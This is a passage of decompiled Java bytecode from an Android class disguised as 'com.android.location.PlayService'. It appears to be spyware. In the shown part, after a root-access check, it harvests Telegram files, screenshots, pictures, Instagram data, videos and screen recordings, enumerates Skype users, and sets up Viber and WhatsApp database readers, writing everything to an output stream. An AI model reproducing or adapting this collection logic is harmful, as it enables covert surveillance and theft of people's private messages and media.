    //   3309: dup
    //   3310: ldc_w 3541
    //   3313: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   3316: lload 7
    //   3318: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   3321: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   3324: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3327: aload 17
    //   3329: astore 11
    //   3331: aload 16
    //   3333: astore 15
    //   3335: aload 18
    //   3337: astore 13
    //   3339: iload_3
    //   3340: istore_2
    //   3341: aload 20
    //   3343: astore 10
    //   3345: aload 16
    //   3347: astore 14
    //   3349: aload 19
    //   3351: astore 12
    //   3353: lload 7
    //   3355: putstatic 623	com/android/location/PlayService:lFBAttCounter	J
    //   3358: iload_3
    //   3359: iconst_1
    //   3360: iadd
    //   3361: istore 4
    //   3363: aload 17
    //   3365: astore 11
    //   3367: aload 16
    //   3369: astore 15
    //   3371: aload 18
    //   3373: astore 13
    //   3375: iload 4
    //   3377: istore_2
    //   3378: aload 20
    //   3380: astore 10
    //   3382: aload 16
    //   3384: astore 14
    //   3386: aload 19
    //   3388: astore 12
    //   3390: invokestatic 1558	com/android/location/PlayService:SaveSettings	()V
    //   3393: aload 17
    //   3395: astore 11
    //   3397: aload 16
    //   3399: astore 15
    //   3401: aload 18
    //   3403: astore 13
    //   3405: iload 4
    //   3407: istore_2
    //   3408: aload 20
    //   3410: astore 10
    //   3412: aload 16
    //   3414: astore 14
    //   3416: aload 19
    //   3418: astore 12
    //   3420: new 864	java/lang/StringBuilder
    //   3423: dup
    //   3424: ldc_w 3543
    //   3427: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   3430: aload_0
    //   3431: aload 16
    //   3433: invokespecial 3495	com/android/location/PlayService:CanMORE	(Ljava/io/FileOutputStream;)Z
    //   3436: invokevirtual 1260	java/lang/StringBuilder:append	(Z)Ljava/lang/StringBuilder;
    //   3439: ldc_w 1262
    //   3442: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   3445: aload_0
    //   3446: ldc 110
    //   3448: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   3451: invokevirtual 1260	java/lang/StringBuilder:append	(Z)Ljava/lang/StringBuilder;
    //   3454: ldc_w 1262
    //   3457: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   3460: astore 21
    //   3462: aload 17
    //   3464: astore 11
    //   3466: aload 16
    //   3468: astore 15
    //   3470: aload 18
    //   3472: astore 13
    //   3474: iload 4
    //   3476: istore_2
    //   3477: aload 20
    //   3479: astore 10
    //   3481: aload 16
    //   3483: astore 14
    //   3485: aload 19
    //   3487: astore 12
    //   3489: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   3492: getstatic 579	com/android/location/PlayService:CAN	B
    //   3495: if_icmpne +5755 -> 9250
    //   3498: iconst_1
    //   3499: istore 9
    //   3501: aload 17
    //   3503: astore 11
    //   3505: aload 16
    //   3507: astore 15
    //   3509: aload 18
    //   3511: astore 13
    //   3513: iload 4
    //   3515: istore_2
    //   3516: aload 20
    //   3518: astore 10
    //   3520: aload 16
    //   3522: astore 14
    //   3524: aload 19
    //   3526: astore 12
    //   3528: aload 21
    //   3530: iload 9
    //   3532: invokevirtual 1260	java/lang/StringBuilder:append	(Z)Ljava/lang/StringBuilder;
    //   3535: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   3538: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3541: iload 4
    //   3543: istore_3
    //   3544: aload 17
    //   3546: astore 11
    //   3548: aload 16
    //   3550: astore 15
    //   3552: aload 18
    //   3554: astore 13
    //   3556: iload 4
    //   3558: istore_2
    //   3559: aload 20
    //   3561: astore 10
    //   3563: aload 16
    //   3565: astore 14
    //   3567: aload 19
    //   3569: astore 12
    //   3571: aload_0
    //   3572: aload 16
    //   3574: invokespecial 3495	com/android/location/PlayService:CanMORE	(Ljava/io/FileOutputStream;)Z
    //   3577: ifeq +481 -> 4058
    //   3580: iload 4
    //   3582: istore_3
    //   3583: aload 17
    //   3585: astore 11
    //   3587: aload 16
    //   3589: astore 15
    //   3591: aload 18
    //   3593: astore 13
    //   3595: iload 4
    //   3597: istore_2
    //   3598: aload 20
    //   3600: astore 10
    //   3602: aload 16
    //   3604: astore 14
    //   3606: aload 19
    //   3608: astore 12
    //   3610: aload_0
    //   3611: ldc 110
    //   3613: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   3616: ifeq +442 -> 4058
    //   3619: iload 4
    //   3621: istore_3
    //   3622: aload 17
    //   3624: astore 11
    //   3626: aload 16
    //   3628: astore 15
    //   3630: aload 18
    //   3632: astore 13
    //   3634: iload 4
    //   3636: istore_2
    //   3637: aload 20
    //   3639: astore 10
    //   3641: aload 16
    //   3643: astore 14
    //   3645: aload 19
    //   3647: astore 12
    //   3649: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   3652: getstatic 579	com/android/location/PlayService:CAN	B
    //   3655: if_icmpne +403 -> 4058
    //   3658: aload 17
    //   3660: astore 11
    //   3662: aload 16
    //   3664: astore 15
    //   3666: aload 18
    //   3668: astore 13
    //   3670: iload 4
    //   3672: istore_2
    //   3673: aload 20
    //   3675: astore 10
    //   3677: aload 16
    //   3679: astore 14
    //   3681: aload 19
    //   3683: astore 12
    //   3685: new 864	java/lang/StringBuilder
    //   3688: dup
    //   3689: ldc_w 3545
    //   3692: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   3695: getstatic 685	com/android/location/PlayService:iPreventReadTG	I
    //   3698: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   3701: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   3704: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3707: aload 17
    //   3709: astore 11
    //   3711: aload 16
    //   3713: astore 15
    //   3715: aload 18
    //   3717: astore 13
    //   3719: iload 4
    //   3721: istore_2
    //   3722: aload 20
    //   3724: astore 10
    //   3726: aload 16
    //   3728: astore 14
    //   3730: aload 19
    //   3732: astore 12
    //   3734: getstatic 685	com/android/location/PlayService:iPreventReadTG	I
    //   3737: istore 5
    //   3739: aload 17
    //   3741: astore 11
    //   3743: aload 16
    //   3745: astore 15
    //   3747: aload 18
    //   3749: astore 13
    //   3751: iload 4
    //   3753: istore_2
    //   3754: aload 20
    //   3756: astore 10
    //   3758: aload 16
    //   3760: astore 14
    //   3762: aload 19
    //   3764: astore 12
    //   3766: iload 5
    //   3768: iconst_1
    //   3769: isub
    //   3770: putstatic 685	com/android/location/PlayService:iPreventReadTG	I
    //   3773: iload 4
    //   3775: istore_3
    //   3776: iload 5
    //   3778: ifgt +280 -> 4058
    //   3781: aload 17
    //   3783: astore 11
    //   3785: aload 16
    //   3787: astore 15
    //   3789: aload 18
    //   3791: astore 13
    //   3793: iload 4
    //   3795: istore_2
    //   3796: aload 20
    //   3798: astore 10
    //   3800: aload 16
    //   3802: astore 14
    //   3804: aload 19
    //   3806: astore 12
    //   3808: new 864	java/lang/StringBuilder
    //   3811: dup
    //   3812: ldc_w 3547
    //   3815: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   3818: getstatic 621	com/android/location/PlayService:lTGAttCounter	J
    //   3821: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   3824: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   3827: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3830: aload 17
    //   3832: astore 11
    //   3834: aload 16
    //   3836: astore 15
    //   3838: aload 18
    //   3840: astore 13
    //   3842: iload 4
    //   3844: istore_2
    //   3845: aload 20
    //   3847: astore 10
    //   3849: aload 16
    //   3851: astore 14
    //   3853: aload 19
    //   3855: astore 12
    //   3857: iconst_0
    //   3858: putstatic 685	com/android/location/PlayService:iPreventReadTG	I
    //   3861: aload 17
    //   3863: astore 11
    //   3865: aload 16
    //   3867: astore 15
    //   3869: aload 18
    //   3871: astore 13
    //   3873: iload 4
    //   3875: istore_2
    //   3876: aload 20
    //   3878: astore 10
    //   3880: aload 16
    //   3882: astore 14
    //   3884: aload 19
    //   3886: astore 12
    //   3888: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   3891: aload 16
    //   3893: getstatic 621	com/android/location/PlayService:lTGAttCounter	J
    //   3896: invokestatic 3550	ru/mobile/protector/TelegramRT:ReadFile	(Landroid/content/Context;Ljava/io/OutputStream;J)J
    //   3899: lstore 7
    //   3901: lload 7
    //   3903: lconst_0
    //   3904: lcmp
    //   3905: ifeq +3586 -> 7491
    //   3908: aload 17
    //   3910: astore 11
    //   3912: aload 16
    //   3914: astore 15
    //   3916: aload 18
    //   3918: astore 13
    //   3920: iload 4
    //   3922: istore_2
    //   3923: aload 20
    //   3925: astore 10
    //   3927: aload 16
    //   3929: astore 14
    //   3931: aload 19
    //   3933: astore 12
    //   3935: lload 7
    //   3937: getstatic 621	com/android/location/PlayService:lTGAttCounter	J
    //   3940: lcmp
    //   3941: ifeq +3550 -> 7491
    //   3944: aload 17
    //   3946: astore 11
    //   3948: aload 16
    //   3950: astore 15
    //   3952: aload 18
    //   3954: astore 13
    //   3956: iload 4
    //   3958: istore_2
    //   3959: aload 20
    //   3961: astore 10
    //   3963: aload 16
    //   3965: astore 14
    //   3967: aload 19
    //   3969: astore 12
    //   3971: new 864	java/lang/StringBuilder
    //   3974: dup
    //   3975: ldc_w 3552
    //   3978: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   3981: lload 7
    //   3983: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   3986: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   3989: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3992: aload 17
    //   3994: astore 11
    //   3996: aload 16
    //   3998: astore 15
    //   4000: aload 18
    //   4002: astore 13
    //   4004: iload 4
    //   4006: istore_2
    //   4007: aload 20
    //   4009: astore 10
    //   4011: aload 16
    //   4013: astore 14
    //   4015: aload 19
    //   4017: astore 12
    //   4019: lload 7
    //   4021: putstatic 621	com/android/location/PlayService:lTGAttCounter	J
    //   4024: iload 4
    //   4026: iconst_1
    //   4027: iadd
    //   4028: istore_3
    //   4029: aload 17
    //   4031: astore 11
    //   4033: aload 16
    //   4035: astore 15
    //   4037: aload 18
    //   4039: astore 13
    //   4041: iload_3
    //   4042: istore_2
    //   4043: aload 20
    //   4045: astore 10
    //   4047: aload 16
    //   4049: astore 14
    //   4051: aload 19
    //   4053: astore 12
    //   4055: invokestatic 1558	com/android/location/PlayService:SaveSettings	()V
    //   4058: iload_3
    //   4059: istore 4
    //   4061: aload 17
    //   4063: astore 11
    //   4065: aload 16
    //   4067: astore 15
    //   4069: aload 18
    //   4071: astore 13
    //   4073: iload_3
    //   4074: istore_2
    //   4075: aload 20
    //   4077: astore 10
    //   4079: aload 16
    //   4081: astore 14
    //   4083: aload 19
    //   4085: astore 12
    //   4087: aload_0
    //   4088: aload 16
    //   4090: invokespecial 3495	com/android/location/PlayService:CanMORE	(Ljava/io/FileOutputStream;)Z
    //   4093: ifeq +116 -> 4209
    //   4096: iload_3
    //   4097: istore 4
    //   4099: aload 17
    //   4101: astore 11
    //   4103: aload 16
    //   4105: astore 15
    //   4107: aload 18
    //   4109: astore 13
    //   4111: iload_3
    //   4112: istore_2
    //   4113: aload 20
    //   4115: astore 10
    //   4117: aload 16
    //   4119: astore 14
    //   4121: aload 19
    //   4123: astore 12
    //   4125: aload_0
    //   4126: sipush 4096
    //   4129: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   4132: ifeq +77 -> 4209
    //   4135: iload_3
    //   4136: istore 4
    //   4138: aload 17
    //   4140: astore 11
    //   4142: aload 16
    //   4144: astore 15
    //   4146: aload 18
    //   4148: astore 13
    //   4150: iload_3
    //   4151: istore_2
    //   4152: aload 20
    //   4154: astore 10
    //   4156: aload 16
    //   4158: astore 14
    //   4160: aload 19
    //   4162: astore 12
    //   4164: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   4167: getstatic 579	com/android/location/PlayService:CAN	B
    //   4170: if_icmpne +39 -> 4209
    //   4173: aload 17
    //   4175: astore 11
    //   4177: aload 16
    //   4179: astore 15
    //   4181: aload 18
    //   4183: astore 13
    //   4185: iload_3
    //   4186: istore_2
    //   4187: aload 20
    //   4189: astore 10
    //   4191: aload 16
    //   4193: astore 14
    //   4195: aload 19
    //   4197: astore 12
    //   4199: iload_3
    //   4200: aload_0
    //   4201: aload 16
    //   4203: invokevirtual 3555	com/android/location/PlayService:ReadScreenShotAdvanced	(Ljava/io/OutputStream;)I
    //   4206: iadd
    //   4207: istore 4
    //   4209: iload 4
    //   4211: istore_3
    //   4212: aload 17
    //   4214: astore 11
    //   4216: aload 16
    //   4218: astore 15
    //   4220: aload 18
    //   4222: astore 13
    //   4224: iload 4
    //   4226: istore_2
    //   4227: aload 20
    //   4229: astore 10
    //   4231: aload 16
    //   4233: astore 14
    //   4235: aload 19
    //   4237: astore 12
    //   4239: aload_0
    //   4240: aload 16
    //   4242: invokespecial 3495	com/android/location/PlayService:CanMORE	(Ljava/io/FileOutputStream;)Z
    //   4245: ifeq +116 -> 4361
    //   4248: iload 4
    //   4250: istore_3
    //   4251: aload 17
    //   4253: astore 11
    //   4255: aload 16
    //   4257: astore 15
    //   4259: aload 18
    //   4261: astore 13
    //   4263: iload 4
    //   4265: istore_2
    //   4266: aload 20
    //   4268: astore 10
    //   4270: aload 16
    //   4272: astore 14
    //   4274: aload 19
    //   4276: astore 12
    //   4278: getstatic 821	com/android/location/PlayService:bLoadPictures	Z
    //   4281: ifeq +80 -> 4361
    //   4284: iload 4
    //   4286: istore_3
    //   4287: aload 17
    //   4289: astore 11
    //   4291: aload 16
    //   4293: astore 15
    //   4295: aload 18
    //   4297: astore 13
    //   4299: iload 4
    //   4301: istore_2
    //   4302: aload 20
    //   4304: astore 10
    //   4306: aload 16
    //   4308: astore 14
    //   4310: aload 19
    //   4312: astore 12
    //   4314: aload_0
    //   4315: sipush 4096
    //   4318: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   4321: ifeq +40 -> 4361
    //   4324: aload 17
    //   4326: astore 11
    //   4328: aload 16
    //   4330: astore 15
    //   4332: aload 18
    //   4334: astore 13
    //   4336: iload 4
    //   4338: istore_2
    //   4339: aload 20
    //   4341: astore 10
    //   4343: aload 16
    //   4345: astore 14
    //   4347: aload 19
    //   4349: astore 12
    //   4351: iload 4
    //   4353: aload_0
    //   4354: aload 16
    //   4356: invokevirtual 3558	com/android/location/PlayService:ReadPictures	(Ljava/io/OutputStream;)I
    //   4359: iadd
    //   4360: istore_3
    //   4361: iload_3
    //   4362: istore 4
    //   4364: aload 17
    //   4366: astore 11
    //   4368: aload 16
    //   4370: astore 15
    //   4372: aload 18
    //   4374: astore 13
    //   4376: iload_3
    //   4377: istore_2
    //   4378: aload 20
    //   4380: astore 10
    //   4382: aload 16
    //   4384: astore 14
    //   4386: aload 19
    //   4388: astore 12
    //   4390: aload_0
    //   4391: aload 16
    //   4393: invokespecial 3495	com/android/location/PlayService:CanMORE	(Ljava/io/FileOutputStream;)Z
    //   4396: ifeq +115 -> 4511
    //   4399: iload_3
    //   4400: istore 4
    //   4402: aload 17
    //   4404: astore 11
    //   4406: aload 16
    //   4408: astore 15
    //   4410: aload 18
    //   4412: astore 13
    //   4414: iload_3
    //   4415: istore_2
    //   4416: aload 20
    //   4418: astore 10
    //   4420: aload 16
    //   4422: astore 14
    //   4424: aload 19
    //   4426: astore 12
    //   4428: aload_0
    //   4429: ldc -82
    //   4431: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   4434: ifeq +77 -> 4511
    //   4437: iload_3
    //   4438: istore 4
    //   4440: aload 17
    //   4442: astore 11
    //   4444: aload 16
    //   4446: astore 15
    //   4448: aload 18
    //   4450: astore 13
    //   4452: iload_3
    //   4453: istore_2
    //   4454: aload 20
    //   4456: astore 10
    //   4458: aload 16
    //   4460: astore 14
    //   4462: aload 19
    //   4464: astore 12
    //   4466: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   4469: getstatic 579	com/android/location/PlayService:CAN	B
    //   4472: if_icmpne +39 -> 4511
    //   4475: aload 17
    //   4477: astore 11
    //   4479: aload 16
    //   4481: astore 15
    //   4483: aload 18
    //   4485: astore 13
    //   4487: iload_3
    //   4488: istore_2
    //   4489: aload 20
    //   4491: astore 10
    //   4493: aload 16
    //   4495: astore 14
    //   4497: aload 19
    //   4499: astore 12
    //   4501: iload_3
    //   4502: aload_0
    //   4503: aload 16
    //   4505: invokevirtual 3561	com/android/location/PlayService:ReadInstagram	(Ljava/io/OutputStream;)I
    //   4508: iadd
    //   4509: istore 4
    //   4511: iload 4
    //   4513: istore 5
    //   4515: aload 17
    //   4517: astore 11
    //   4519: aload 16
    //   4521: astore 15
    //   4523: aload 18
    //   4525: astore 13
    //   4527: iload 4
    //   4529: istore_2
    //   4530: aload 20
    //   4532: astore 10
    //   4534: aload 16
    //   4536: astore 14
    //   4538: aload 19
    //   4540: astore 12
    //   4542: aload_0
    //   4543: aload 16
    //   4545: invokespecial 3495	com/android/location/PlayService:CanMORE	(Ljava/io/FileOutputStream;)Z
    //   4548: ifeq +81 -> 4629
    //   4551: iload 4
    //   4553: istore 5
    //   4555: aload 17
    //   4557: astore 11
    //   4559: aload 16
    //   4561: astore 15
    //   4563: aload 18
    //   4565: astore 13
    //   4567: iload 4
    //   4569: istore_2
    //   4570: aload 20
    //   4572: astore 10
    //   4574: aload 16
    //   4576: astore 14
    //   4578: aload 19
    //   4580: astore 12
    //   4582: aload_0
    //   4583: ldc -65
    //   4585: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   4588: ifeq +41 -> 4629
    //   4591: aload 17
    //   4593: astore 11
    //   4595: aload 16
    //   4597: astore 15
    //   4599: aload 18
    //   4601: astore 13
    //   4603: iload 4
    //   4605: istore_2
    //   4606: aload 20
    //   4608: astore 10
    //   4610: aload 16
    //   4612: astore 14
    //   4614: aload 19
    //   4616: astore 12
    //   4618: iload 4
    //   4620: aload_0
    //   4621: aload 16
    //   4623: invokevirtual 3564	com/android/location/PlayService:ReadVideos	(Ljava/io/OutputStream;)I
    //   4626: iadd
    //   4627: istore 5
    //   4629: iload 5
    //   4631: istore_3
    //   4632: aload 17
    //   4634: astore 11
    //   4636: aload 16
    //   4638: astore 15
    //   4640: aload 18
    //   4642: astore 13
    //   4644: iload 5
    //   4646: istore_2
    //   4647: aload 20
    //   4649: astore 10
    //   4651: aload 16
    //   4653: astore 14
    //   4655: aload 19
    //   4657: astore 12
    //   4659: aload_0
    //   4660: aload 16
    //   4662: invokespecial 3495	com/android/location/PlayService:CanMORE	(Ljava/io/FileOutputStream;)Z
    //   4665: ifeq +79 -> 4744
    //   4668: iload 5
    //   4670: istore_3
    //   4671: aload 17
    //   4673: astore 11
    //   4675: aload 16
    //   4677: astore 15
    //   4679: aload 18
    //   4681: astore 13
    //   4683: iload 5
    //   4685: istore_2
    //   4686: aload 20
    //   4688: astore 10
    //   4690: aload 16
    //   4692: astore 14
    //   4694: aload 19
    //   4696: astore 12
    //   4698: aload_0
    //   4699: ldc -65
    //   4701: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   4704: ifeq +40 -> 4744
    //   4707: aload 17
    //   4709: astore 11
    //   4711: aload 16
    //   4713: astore 15
    //   4715: aload 18
    //   4717: astore 13
    //   4719: iload 5
    //   4721: istore_2
    //   4722: aload 20
    //   4724: astore 10
    //   4726: aload 16
    //   4728: astore 14
    //   4730: aload 19
    //   4732: astore 12
    //   4734: iload 5
    //   4736: aload_0
    //   4737: aload 16
    //   4739: invokevirtual 3567	com/android/location/PlayService:ReadScreenRecord	(Ljava/io/OutputStream;)I
    //   4742: iadd
    //   4743: istore_3
    //   4744: aload 17
    //   4746: astore 11
    //   4748: aload 16
    //   4750: astore 15
    //   4752: aload 18
    //   4754: astore 13
    //   4756: iload_3
    //   4757: istore_2
    //   4758: aload 20
    //   4760: astore 10
    //   4762: aload 16
    //   4764: astore 14
    //   4766: aload 19
    //   4768: astore 12
    //   4770: ldc_w 3569
    //   4773: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4776: aload 17
    //   4778: astore 11
    //   4780: aload 16
    //   4782: astore 15
    //   4784: aload 18
    //   4786: astore 13
    //   4788: iload_3
    //   4789: istore_2
    //   4790: aload 20
    //   4792: astore 10
    //   4794: aload 16
    //   4796: astore 14
    //   4798: aload 19
    //   4800: astore 12
    //   4802: aload_0
    //   4803: getfield 958	com/android/location/PlayService:bSkypeUsersRed	Z
    //   4806: ifne +195 -> 5001
    //   4809: aload 17
    //   4811: astore 11
    //   4813: aload 16
    //   4815: astore 15
    //   4817: aload 18
    //   4819: astore 13
    //   4821: iload_3
    //   4822: istore_2
    //   4823: aload 20
    //   4825: astore 10
    //   4827: aload 16
    //   4829: astore 14
    //   4831: aload 19
    //   4833: astore 12
    //   4835: invokestatic 3575	ru/dtlbox/databasereader/SkypeReader:getUsers	()Ljava/util/List;
    //   4838: astore 21
    //   4840: aload 17
    //   4842: astore 11
    //   4844: aload 16
    //   4846: astore 15
    //   4848: aload 18
    //   4850: astore 13
    //   4852: iload_3
    //   4853: istore_2
    //   4854: aload 20
    //   4856: astore 10
    //   4858: aload 16
    //   4860: astore 14
    //   4862: aload 19
    //   4864: astore 12
    //   4866: aload_0
    //   4867: iconst_1
    //   4868: putfield 958	com/android/location/PlayService:bSkypeUsersRed	Z
    //   4871: aload 17
    //   4873: astore 11
    //   4875: aload 16
    //   4877: astore 15
    //   4879: aload 18
    //   4881: astore 13
    //   4883: iload_3
    //   4884: istore_2
    //   4885: aload 20
    //   4887: astore 10
    //   4889: aload 16
    //   4891: astore 14
    //   4893: aload 19
    //   4895: astore 12
    //   4897: aload 21
    //   4899: invokeinterface 3576 1 0
    //   4904: istore 5
    //   4906: iload 5
    //   4908: ifle +2806 -> 7714
    //   4911: aload 17
    //   4913: astore 11
    //   4915: aload 16
    //   4917: astore 15
    //   4919: aload 18
    //   4921: astore 13
    //   4923: iload_3
    //   4924: istore_2
    //   4925: aload 20
    //   4927: astore 10
    //   4929: aload 16
    //   4931: astore 14
    //   4933: aload 19
    //   4935: astore 12
    //   4937: aload_0
    //   4938: new 980	java/util/ArrayList
    //   4941: dup
    //   4942: invokespecial 981	java/util/ArrayList:<init>	()V
    //   4945: putfield 960	com/android/location/PlayService:userListSkype	Ljava/util/ArrayList;
    //   4948: aload 17
    //   4950: astore 11
    //   4952: aload 16
    //   4954: astore 15
    //   4956: aload 18
    //   4958: astore 13
    //   4960: iload_3
    //   4961: istore_2
    //   4962: aload 20
    //   4964: astore 10
    //   4966: aload 16
    //   4968: astore 14
    //   4970: aload 19
    //   4972: astore 12
    //   4974: new 864	java/lang/StringBuilder
    //   4977: dup
    //   4978: ldc_w 3578
    //   4981: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   4984: iload 5
    //   4986: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   4989: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   4992: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4995: iconst_0
    //   4996: istore 4
    //   4998: goto +4242 -> 9240
    //   5001: aload 17
    //   5003: astore 11
    //   5005: aload 16
    //   5007: astore 15
    //   5009: aload 18
    //   5011: astore 13
    //   5013: iload_3
    //   5014: istore_2
    //   5015: aload 20
    //   5017: astore 10
    //   5019: aload 16
    //   5021: astore 14
    //   5023: aload 19
    //   5025: astore 12
    //   5027: aload_0
    //   5028: aload 16
    //   5030: invokespecial 3495	com/android/location/PlayService:CanMORE	(Ljava/io/FileOutputStream;)Z
    //   5033: ifeq +3366 -> 8399
    //   5036: aload 17
    //   5038: astore 11
    //   5040: aload 16
    //   5042: astore 15
    //   5044: aload 18
    //   5046: astore 13
    //   5048: iload_3
    //   5049: istore_2
    //   5050: aload 20
    //   5052: astore 10
    //   5054: aload 16
    //   5056: astore 14
    //   5058: aload 19
    //   5060: astore 12
    //   5062: aload_0
    //   5063: bipush 64
    //   5065: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   5068: ifeq +3331 -> 8399
    //   5071: aload 17
    //   5073: astore 11
    //   5075: aload 16
    //   5077: astore 15
    //   5079: aload 18
    //   5081: astore 13
    //   5083: iload_3
    //   5084: istore_2
    //   5085: aload 20
    //   5087: astore 10
    //   5089: aload 16
    //   5091: astore 14
    //   5093: aload 19
    //   5095: astore 12
    //   5097: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   5100: getstatic 579	com/android/location/PlayService:CAN	B
    //   5103: if_icmpne +3296 -> 8399
    //   5106: aload 17
    //   5108: astore 11
    //   5110: aload 16
    //   5112: astore 15
    //   5114: aload 18
    //   5116: astore 13
    //   5118: iload_3
    //   5119: istore_2
    //   5120: aload 20
    //   5122: astore 10
    //   5124: aload 16
    //   5126: astore 14
    //   5128: aload 19
    //   5130: astore 12
    //   5132: aload_0
    //   5133: getfield 960	com/android/location/PlayService:userListSkype	Ljava/util/ArrayList;
    //   5136: ifnull +3263 -> 8399
    //   5139: aload 17
    //   5141: astore 11
    //   5143: aload 16
    //   5145: astore 15
    //   5147: aload 18
    //   5149: astore 13
    //   5151: iload_3
    //   5152: istore_2
    //   5153: aload 20
    //   5155: astore 10
    //   5157: aload 16
    //   5159: astore 14
    //   5161: aload 19
    //   5163: astore 12
    //   5165: ldc_w 3580
    //   5168: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5171: aload 17
    //   5173: astore 11
    //   5175: aload 16
    //   5177: astore 15
    //   5179: aload 18
    //   5181: astore 13
    //   5183: iload_3
    //   5184: istore_2
    //   5185: aload 20
    //   5187: astore 10
    //   5189: aload 16
    //   5191: astore 14
    //   5193: aload 19
    //   5195: astore 12
    //   5197: aload_0
    //   5198: getfield 960	com/android/location/PlayService:userListSkype	Ljava/util/ArrayList;
    //   5201: invokevirtual 2114	java/util/ArrayList:size	()I
    //   5204: istore 6
    //   5206: iconst_0
    //   5207: istore 5
    //   5209: iload 5
    //   5211: iload 6
    //   5213: if_icmplt +2536 -> 7749
    //   5216: aload 17
    //   5218: astore 11
    //   5220: aload 16
    //   5222: astore 15
    //   5224: aload 18
    //   5226: astore 13
    //   5228: iload_3
    //   5229: istore_2
    //   5230: aload 20
    //   5232: astore 10
    //   5234: aload 16
    //   5236: astore 14
    //   5238: aload 19
    //   5240: astore 12
    //   5242: iconst_0
    //   5243: putstatic 597	com/android/location/PlayService:bResetSkypeAttach	Z
    //   5246: aload 17
    //   5248: astore 11
    //   5250: aload 16
    //   5252: astore 15
    //   5254: aload 18
    //   5256: astore 13
    //   5258: iload_3
    //   5259: istore_2
    //   5260: aload 20
    //   5262: astore 10
    //   5264: aload 16
    //   5266: astore 14
    //   5268: aload 19
    //   5270: astore 12
    //   5272: aload_0
    //   5273: getfield 1043	com/android/location/PlayService:mViberReader	Lru/dtlbox/databasereader/ViberReader;
    //   5276: ifnonnull +43 -> 5319
    //   5279: aload 17
    //   5281: astore 11
    //   5283: aload 16
    //   5285: astore 15
    //   5287: aload 18
    //   5289: astore 13
    //   5291: iload_3
    //   5292: istore_2
    //   5293: aload 20
    //   5295: astore 10
    //   5297: aload 16
    //   5299: astore 14
    //   5301: aload 19
    //   5303: astore 12
    //   5305: aload_0
    //   5306: new 3582	ru/dtlbox/databasereader/ViberReader
    //   5309: dup
    //   5310: getstatic 559	com/android/location/PlayService:megaconfig	Lru/dtlbox/databasereader/Config;
    //   5313: invokespecial 3584	ru/dtlbox/databasereader/ViberReader:<init>	(Lru/dtlbox/databasereader/Config;)V
    //   5316: putfield 1043	com/android/location/PlayService:mViberReader	Lru/dtlbox/databasereader/ViberReader;
    //   5319: aload 17
    //   5321: astore 11
    //   5323: aload 16
    //   5325: astore 15
    //   5327: aload 18
    //   5329: astore 13
    //   5331: iload_3
    //   5332: istore_2
    //   5333: aload 20
    //   5335: astore 10
    //   5337: aload 16
    //   5339: astore 14
    //   5341: aload 19
    //   5343: astore 12
    //   5345: aload_0
    //   5346: getfield 1045	com/android/location/PlayService:mWhatsAppReader	Lru/dtlbox/databasereader/WhatsAppReader;
    //   5349: ifnonnull +43 -> 5392
    //   5352: aload 17
    //   5354: astore 11
    //   5356: aload 16
    //   5358: astore 15
    //   5360: aload 18
    //   5362: astore 13
    //   5364: iload_3
    //   5365: istore_2
    //   5366: aload 20
    //   5368: astore 10
    //   5370: aload 16
    //   5372: astore 14
    //   5374: aload 19
    //   5376: astore 12
    //   5378: aload_0
    //   5379: new 3586	ru/dtlbox/databasereader/WhatsAppReader
    //   5382: dup
    //   5383: getstatic 559	com/android/location/PlayService:megaconfig	Lru/dtlbox/databasereader/Config;
    //   5386: invokespecial 3587	ru/dtlbox/databasereader/WhatsAppReader:<init>	(Lru/dtlbox/databasereader/Config;)V
    //   5389: putfield 1045	com/android/location/PlayService:mWhatsAppReader	Lru/dtlbox/databasereader/WhatsAppReader;
    //   5392: aload 17
    //   5394: astore 11
